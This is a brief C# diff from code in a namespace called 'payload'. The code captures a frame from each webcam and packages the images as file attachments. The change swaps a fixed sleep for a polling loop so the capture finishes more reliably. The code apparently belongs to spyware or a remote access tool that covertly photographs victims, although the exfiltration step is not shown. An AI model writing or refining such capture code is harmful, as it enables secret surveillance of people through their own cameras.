@@ -135,7 +135,7 @@ namespace payload
                             VideoCaptureDevice vsource = new VideoCaptureDevice(device.MonikerString);
                             vsource.NewFrame += new NewFrameEventHandler((sender, e) => { images.Add((Bitmap)e.Frame.Clone()); vsource.SignalToStop(); });
                             vsource.Start();
-                            Thread.Sleep(1000);
+                            for (int i = 0; i < 10; i++) if (vsource.IsRunning) Thread.Sleep(100);
                         }
                         List<FileAttachment> pictures = new List<FileAttachment>();
                         foreach (Bitmap image in images)
